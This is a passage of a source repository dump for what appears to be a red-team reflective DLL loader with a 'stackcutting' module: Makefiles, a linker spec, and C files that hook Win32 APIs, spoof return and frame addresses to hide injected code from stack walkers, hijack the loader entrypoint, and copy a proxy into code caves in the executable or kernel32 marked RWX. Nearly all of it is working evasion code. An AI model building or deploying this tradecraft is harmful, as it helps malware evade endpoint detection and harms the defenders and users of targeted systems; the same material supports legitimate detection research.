			run "freeandrun.spec"

			foreach %HOOKS: call %_ "hooks"
			filterhooks $DLL
			addhook "KERNEL32$GetProcAddress" "_GetProcAddress"

			export
			link "my_hooks"

		export

```

## File: simple_rdll_hook/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/free.c -o bin/free.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/hook.c -o bin/hook.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/free.c -o bin/free.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/hook.c -o bin/hook.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_hook/modules/stackcutting/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_rdll_hook/modules/stackcutting/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

# our proxy.c expects a very specific stackframe layout and function prologue. We disable optimizations to
# preserve it. This applies to x86 and x64.

x86: bin
	$(CC) -DWIN_X86 -O0 -fno-jump-tables -shared -Wall -Wno-pointer-arith -c src/proxy.c -o bin/proxy.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/stackcut.c -o bin/stackcut.x86.o
	$(CC) -DWIN_X86 $(CFLAGS) -c src/stackcut_setup.c -o bin/stackcut_setup.x86.o

x64: bin
	$(CC_64) -DWIN_X64 -O0 -fno-jump-tables -shared -Wall -Wno-pointer-arith -c src/proxy.c -o bin/proxy.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/stackcut.c -o bin/stackcut.x64.o
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/stackcut_setup.c -o bin/stackcut_setup.x64.o

clean:
	rm -rf bin

```

## File: simple_rdll_hook/modules/stackcutting/stackcutting.spec

```text
#
# some helper labels, since we specify the attach functions twice.
#
attach.x86:
	# attach Win32 API interests to our hook functions
	attach "KERNEL32$LoadLibraryA"   "__cLoadLibraryA@4"
	attach "KERNEL32$Sleep"          "__cSleep@4"
	attach "KERNEL32$VirtualAlloc"   "__cVirtualAlloc@16"
	attach "KERNEL32$VirtualProtect" "__cVirtualProtect@16"
	attach "USER32$MessageBoxA"      "__cMessageBoxA@16"

	# since this is a terminal hooking (e.g., we expect DIRECT access to the Win32 API), I'm using protect to prevent
	# anything else from hooking/incepting our hook functions themselves
	protect "__cLoadLibraryA@4, __cSleep@4, __cVirtualAlloc@16, __cVirtualProtect@16, __cMessageBoxA@16"

attach.x64:
	attach "KERNEL32$LoadLibraryA"   "_cLoadLibraryA"
	attach "KERNEL32$Sleep"          "_cSleep"
	attach "KERNEL32$VirtualAlloc"   "_cVirtualAlloc"
	attach "KERNEL32$VirtualProtect" "_cVirtualProtect"
	attach "USER32$MessageBoxA"      "_cMessageBoxA"

	protect "_cLoadLibraryA, _cSleep, _cVirtualAlloc, _cVirtualProtect, _cMessageBoxA"

#
# Setup our stack cutting tradecraft.
#
setup.x86:
	# GYMNASTICS WARNING: stackcutting has to execute before anything else to get the safe return/frame address. So,
	# before we merge anything, we're going to get rid of the old go() function. Our stackcut_setup.x86 will have a new
	# go() function.
	remap "_go" "_go_away"

	# load+merge our stackcutting initialization logic
	load "bin/stackcut_setup.x86.o"
		merge

	# the getStart() function in loader.c STILL refers to _go_away (it's a linkage by relative address, not symbol); so
	# we use redirect to change that reference to our newly merged in go. Voila, we've taken ovr the entrypoint function
	redirect "_go_away" "_go"

	# load+merge our stackcutting hooks... because this is where our globals are too
	load "bin/stackcut.x86.o"
		merge

	# load our proxy PIC as a resource.
	load "bin/proxy.x86.o"
		# This is PIC but we're not bothering with dfr, fixptrs, and +gofirst. It's not needed here. This PIC is 
		# a simple one-off call gate function.
		make pic
		export
		preplen
		link "my_proxy"

	# register this with our thing.
	redirect "_setupHooks" "_setupHooksStackCutting"

	# we use optout to protect _SetupProxy from its own hooks, but to leave it open to inception by another module
	optout "_SetupProxy" "__cVirtualAlloc@16, __cVirtualProtect@16"

	# WHY yes... we can HOOK our loader PIC with the same hook code used in our IAT hooking. This is one of the 
	# reasons I wanted to merge our stack cutting hooks into this loader/setup module too. They do double duty now :)
	.attach

	# While .attach let's our hooks do double-duty (e.g., getting used to incept our own PIC)--in practice VirtualAlloc 
	# and LoadLibraryA are what's kept and used here. But, hey... transparent stack tradecraft in a PIC DLL loader that's 
	# applying stack tradecraft to a DLL is pretty damned cool, right?
	#
	# To see what's kept after link-time optimization, uncomment this line. It's also a good opportunity to look at how
	# and where _LoadLibraryA and _VirtualAlloc are called. You'll see they're just weaved into the program
	#disassemble "setup.x86.txt"

setup.x64:
	remap "go" "go_away"

	load "bin/stackcut_setup.x64.o"
		merge

	redirect "go_away" "go"

	load "bin/stackcut.x64.o"
		merge

	load "bin/proxy.x64.o"
		make pic
		export
		preplen
		link "my_proxy"

	redirect "setupHooks" "setupHooksStackCutting"

	optout "SetupProxy" "_cVirtualAlloc, _cVirtualProtect"

	.attach

	#disassemble "setup.x64.txt"

#
# configure the stackcutting hooks (this is to be merged in with our hooks PICO, right?)
#
hooks.x86:
	# load our stack cutting hooks logic and merge with the hooks PICO
	load "bin/stackcut.x86.o"
		merge

	# export our confighooks function, which is necessary for setupHooksStackCutting to
	# find our configstackcutting function mixed into the hooks PICO
	exportfunc "_configstackcutting" "___tag_configstackcutting"

	# add our hooks, which will return attach chain entries
	addhook "KERNEL32$LoadLibraryA"
	addhook "KERNEL32$Sleep"
	addhook "KERNEL32$VirtualAlloc"
	addhook "KERNEL32$VirtualProtect"
	addhook "USER32$MessageBoxA"

	# attach to our Win32 APIs
	.attach

hooks.x64:
	load "bin/stackcut.x64.o"
		merge

	exportfunc "configstackcutting" "__tag_configstackcutting"

	addhook "KERNEL32$LoadLibraryA"
	addhook "KERNEL32$Sleep"
	addhook "KERNEL32$VirtualAlloc"
	addhook "KERNEL32$VirtualProtect"
	addhook "USER32$MessageBoxA"

	.attach

```

## File: simple_rdll_hook/modules/stackcutting/src/proxy.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "proxy.h"

typedef ULONG_PTR WINAPI (*CALL0)();
typedef ULONG_PTR WINAPI (*CALL1)(ULONG_PTR);
typedef ULONG_PTR WINAPI (*CALL2)(ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR WINAPI (*CALL3)(ULONG_PTR, ULONG_PTR, ULONG_PTR);
typedef ULONG_PTR WINAPI (*CALL4)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);

ULONG_PTR proxy(PROXYCALL * call) {
	ULONG_PTR result;

	/* grab and backup our previous frame ptr and ret addr */
	call->temp.p_frame    = (FRAME *)__builtin_frame_address(0);
	call->temp.frame      = *(call->temp.p_frame);

	/* spoof our frame address and return address */
	*(call->temp.p_frame) = call->spoofme;

#ifdef WIN_X64
	/* And, what is... going on... HERE...
	 *
	 * This is the guesswork of Raphael, his limited knowledge, and alone time with
	 * a debugger. I had high hopes. I could just FIX the damned frame pointer and
	 * stack pointer and suddenly... suddenly... my stack would look AWESOME.
	 *
	 * But, that's not what happened. :(
	 *
	 * The CPU isn't the judge here. It follows the instructions and does what it
	 * does. We're up against StackWalk, which is a mix of reading .pdata (not
	 * applicable here) and making guesses.
	 *
	 * When its assumptions break, it starts to try to treat everything as a return
	 * address before it gives up. It's much more complicated than that (from my quick
	 * read of ReactOS code).
	 *
	 * So, first things first, let's set our desired return address to the very top
	 * of the frame (bottom most address). This is DEPENDENT on the number of local
	 * vars. So, you'll need to read the pre-amble to this function (if you change it)
	 * to determine where that's at.
	 *
	 * x86_64-w64-mingw32-objdump -d proxy.x64.o
	 *
	 * 0000000000000000 <proxy>:
	 * 0:	55                   	push   %rbp
	 * 1:	48 89 e5             	mov    %rsp,%rbp
	 * 4:	53                   	push   %rbx
	 * 5:	48 83 ec 38          	sub    $0x38,%rsp
	 *
	 * We push rbx (8b) and create 0x38 (56b) of stack space. So, 64 / 8--we want to
	 * stick our return address at -8 from our frame address (rbp).
	 */
	*((ULONG_PTR *)__builtin_frame_address(0) - 8) = call->spoofme.retaddr;

	/* Oh, but our hell isn't done yet. You see, some functions use that lovely space
	 * at the top of our frame (shadow space) to store some non-volatile / callee saved
	 * registers. Not all. But, some do. And when that happens, my carefully crafted
	 * plans fall apart and the above value gets STOMPED breaking our illusion.
	 *
	 * What's an example of a function that does this? Sleep/SleepEx.
	 *
	 * What's an example of a function you're guaranteed to try to hook to see if this
	 * works? Sleep/SleepEx.
	 *
	 * So, here's the fix for that... find the register that's propagating back to our
	 * shadow space in the frame and set it to our return address. Things will work out
	 * fine after doing this. */
	register ULONG_PTR fixrbx asm("rbx") __attribute__((unused)) = call->spoofme.retaddr;
#else
	/* for ONCE, x86 isn't the problem */
#endif

	/* let's make our proxied call (separate of this stack munging nonsense) */
	if (call->argc == 0) {
		result = ((CALL0)call->function)();
	}
	else if (call->argc == 1) {
		result = ((CALL1)call->function)(call->args[0]);
	}
	else if (call->argc == 2) {
		result = ((CALL2)call->function)(call->args[0], call->args[1]);
	}
	else if (call->argc == 3) {
		result = ((CALL3)call->function)(call->args[0], call->args[1], call->args[2]);
	}
	else if (call->argc == 4) {
		result = ((CALL4)call->function)(call->args[0], call->args[1], call->args[2], call->args[3]);
	}

	/* restore our previous frame ptr and ret addr */
	*(call->temp.p_frame) = call->temp.frame;

	return result;
}

```

## File: simple_rdll_hook/modules/stackcutting/src/proxy.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>

/*
 * Set the return address and frame address of the (real) stack frame we want to point back to. I use
 * this to create a stack that looks like our non-module backed code was never called. If you don't have
 * anything like that, then set both to 0 to break some means of stack unwinding.
 */
typedef struct {
	ULONG_PTR   frameaddr;
	ULONG_PTR   retaddr;
} FRAME;

/*
 * This is an internal struct, just keeping some info off of the stack, so I don't have to keep
 * adjusting proxy.c based on the number of local vars.
 *
 * You, as an API caller, have no responsibility to any of this.
 */
typedef struct {
	FRAME     * p_frame;
	FRAME       frame;
} __INTERNAL;

/*
 * Our proxycall struct, this is where we pass in arguments for our PIC proxy function
 * to act on. Each of the arguments is annotated below.
 */
typedef struct {
	ULONG_PTR  function; 	/* a pointer to the function we want the proxy to call */
	DWORD      argc;	/* the number of arguments being passed, args[argc] and argc must agree */
	__INTERNAL temp;	/* don't touch this, not even to zero it, used by the proxy function */
	FRAME      spoofme;	/* the return address and frame address we want to "spoof" */
	ULONG_PTR  args[4];	/* the arguments to our function */
} PROXYCALL;

/*
 * And, as simple as this, it's our proxy call function
 */
typedef ULONG_PTR (*PROXY)(PROXYCALL * desc);

```

## File: simple_rdll_hook/modules/stackcutting/src/stackcut.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"
#include "proxy.h"

WINBASEAPI VOID WINAPI KERNEL32$Sleep (DWORD dwMilliseconds);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
WINUSERAPI int  WINAPI USER32$MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType);

/*
 * GLOBALS
 */
PROXY     CallProxy;
PROXYCALL call;

ULONG_PTR proxy(int argc) {
	call.argc              = argc;
	return CallProxy(&call);
}

/*
 * HOOKS
 */
HMODULE WINAPI _cLoadLibraryA (LPCSTR lpLibFileName) {
	call.function = (ULONG_PTR)LoadLibraryA;
	call.args[0]  = (ULONG_PTR)lpLibFileName;

	return (HMODULE)proxy(1);
}

int WINAPI _cMessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType) {
	call.function = (ULONG_PTR)USER32$MessageBoxA;
	call.args[0]  = (ULONG_PTR)hWnd;
	call.args[1]  = (ULONG_PTR)lpText;
	call.args[2]  = (ULONG_PTR)lpCaption;
	call.args[3]  = (ULONG_PTR)uType;

	return (int)proxy(4);
}

VOID WINAPI _cSleep (DWORD dwMilliseconds) {
	call.function = (ULONG_PTR)KERNEL32$Sleep;
	call.args[0]  = (ULONG_PTR)dwMilliseconds;

	proxy(1);
}

LPVOID WINAPI _cVirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	call.function = (ULONG_PTR)KERNEL32$VirtualAlloc;
	call.args[0]  = (ULONG_PTR)lpAddress;
	call.args[1]  = (ULONG_PTR)dwSize;
	call.args[2]  = (ULONG_PTR)flAllocationType;
	call.args[3]  = (ULONG_PTR)flProtect;

	return (LPVOID)proxy(4);
}

WINBOOL WINAPI _cVirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
	call.function = (ULONG_PTR)KERNEL32$VirtualProtect;
	call.args[0]  = (ULONG_PTR)lpAddress;
	call.args[1]  = (ULONG_PTR)dwSize;
	call.args[2]  = (ULONG_PTR)flNewProtect;
	call.args[3]  = (ULONG_PTR)lpflOldProtect;

	return (WINBOOL)proxy(4);
}

/*
 * SETUP PROCESS
 */
void setupHooks(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll);

/* this is a linker intrinsic to get the tag of our confighooks export function. */
int __tag_configstackcutting();

/* function prototype for our stackcutting PICO setup thing */
typedef void (*PICO_CONFIG_STACKCUTTING)(PROXY proxy, char * retaddr, char * frameaddr);

/*
 * Implement the setupHooks function called by loader.c--which is our chance to call our exported config function.
 * We do this here because this is where our global vars with the stack cutting info live
 */
void setupHooksStackCutting(char * srchooks, char * dsthooks, DLLDATA * data, char * dstdll) {
	/* call the function exported by our PICO */
	((PICO_CONFIG_STACKCUTTING)PicoGetExport(srchooks, dsthooks, __tag_configstackcutting())) (CallProxy, (char *)call.spoofme.retaddr, (char *)call.spoofme.frameaddr);

	/* continue the chain */
	setupHooks(srchooks, dsthooks, data, dstdll);
}

/*
 * EXPORT
 */

/* receive a configuration from elsewhere.. we export this function */
void configstackcutting(PROXY proxy, char * retaddr, char * frameaddr) {
	/*
	 * Keep track of the return address and frame pointer from the context that called our loader. These are
	 * the values we are going to "spoof" later on.
	 *
	 * Note, I've opted to detect when the framepointer is NULL, and use that as a clue that our execution
	 * started from a context without a good frame behind us (e.g., CreateRemoteThread). In these situations,
	 * if we spam the return address without a valid frame pointer--we're going to get a stack unwinding that's
	 * less predictable.
	 *
	 * By opting to NULL the return address when the frame pointer is null, my goal is to, at least, get a
	 * truncated call stack in these situations.
	 */
	if (frameaddr == 0) {
		call.spoofme.retaddr   = (ULONG_PTR)retaddr;
		call.spoofme.frameaddr = (ULONG_PTR)frameaddr;
	}
	else {
		call.spoofme.retaddr   = (ULONG_PTR)retaddr;
		call.spoofme.frameaddr = (ULONG_PTR)frameaddr;
	}

	/* set our call proxy too */
	CallProxy = proxy;
}

```

## File: simple_rdll_hook/modules/stackcutting/src/stackcut_setup.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"
#include "proxy.h"

WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR lpModuleName);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char rPROXYPIC[0]    __attribute__((section("my_proxy")));

/* these might help */
#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);
#define FLAG(x, y) ( ((x) & (y)) == (y) )
#define ROUND_DOWN_PAGE(x) (char *)((ULONG_PTR)x - ((ULONG_PTR)x % 0x1000))

/*
 * find slack space at the end of an eXecutable section that can fit our payload.
 */
char * findCodeCave(char * dllBase, int length) {
	DLLDATA                 data;
	DWORD                   numberOfSections;
	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
	IMAGE_SECTION_HEADER  * sectionNxt       = NULL;

	/* parse our DLL! */
	ParseDLL(dllBase, &data);

	/* loop through our sections */
	numberOfSections = data.NtHeaders->FileHeader.NumberOfSections;
	sectionHdr       = (IMAGE_SECTION_HEADER *)PTR_OFFSET(data.OptionalHeader, data.NtHeaders->FileHeader.SizeOfOptionalHeader);
	for (int x = 0; (x + 1) < numberOfSections; x++) {
		/* look for our eXecutable section, there-in lives our... code cave */
		if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE)) {
			/* let's look at our next section, we need it to get the right size of the code cave */
			sectionNxt      = sectionHdr + 1;

			/* calculate the size, based on section headers */
			DWORD size      = sectionNxt->VirtualAddress - sectionHdr->VirtualAddress;

			/* calculate the size of our code cave */
			DWORD cavesize  = size - sectionHdr->Misc.VirtualSize;

			/* if we fit, return it */
			if (length < cavesize)
				return dllBase + (sectionNxt->VirtualAddress - cavesize);
		}

		/* advance to our next section */
		sectionHdr++;
	}

	return NULL;
}

/*
 * Install our proxy PIC somewhere in memory, ideally in image memory (e.g., backed by a module on disk). This is
 * a risky and unmasked operation... but once this is done, we've got a nice call stack munging proxy that can run
 * whatever we give to it. And, that's pretty cool.
 */
PROXY SetupProxy() {
	_RESOURCE  * src;
	DWORD        oldProt;
	char       * hModule;
	PROXY        proxy;

	src = (_RESOURCE *)&rPROXYPIC;

	/* (1) we're going to search for a code cave in... our executable */
	hModule = (char *)KERNEL32$GetModuleHandleA(NULL);
	proxy   = (PROXY)findCodeCave(hModule, src->length);

	/* (2) if we can't find a code cave in our executable, let's find one elsewhere. How about kernel32?
	 * And, a good place to note: bad idea on x86. There are reserved sections between sections breaking
	 * my code cave calculation algorithm. You'll end up in memory you don't want to be in. */
#ifdef WIN_X64
	if (proxy == NULL) {
		/*
		 * Note, we could use a stack string here or findModuleByHash with the ror13 hash of KERNEL32
		 * But, my goal is demonstration of concepts and not leetsy-neatsy-wow, I applied ro13 999x
		 * style "mastery of OPSEC"
		 */
		hModule   = (char *)KERNEL32$GetModuleHandleA("KERNEL32");
		proxy     = (PROXY)findCodeCave(hModule, src->length);
	}
#endif
	/* (3) if there's no space in our executable, then just do a VirtualAlloc--life goes on */
	if (proxy == NULL)
		proxy = (PROXY)KERNEL32$VirtualAlloc( NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );

	/* change the permissions of our PIC to RWX */
	KERNEL32$VirtualProtect(ROUND_DOWN_PAGE(proxy), 0x1000, PAGE_EXECUTE_READWRITE, &oldProt);

	/* copy our proxy PIC over */
	memcpy(proxy, src->value, src->length);

	return proxy;
}

/* our config functions */
void configstackcutting(PROXY proxy, char * retaddr, char * frameaddr);

/* our initialization chain */
void init();

/*
 * Our new entrypoint that's going to hijack the existing one.
 */
void go() {
	/*
	 * Note, we're using MingW64 intrinsics to get our frame ptr and return address.
	 * I'm peeking the value of the frame ptr here to go one frame up.
	 */
	char * retaddr   = __builtin_return_address(0);
	char * frameaddr = *(char **)__builtin_frame_address(0);

	/* setup our proxy */
	PROXY proxy = SetupProxy();

	/* push it over to our other module */
	configstackcutting(proxy, retaddr, frameaddr);

	/* start our init chain */
	init();
}

```

## File: simple_rdll_hook/modules/stackcutting/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
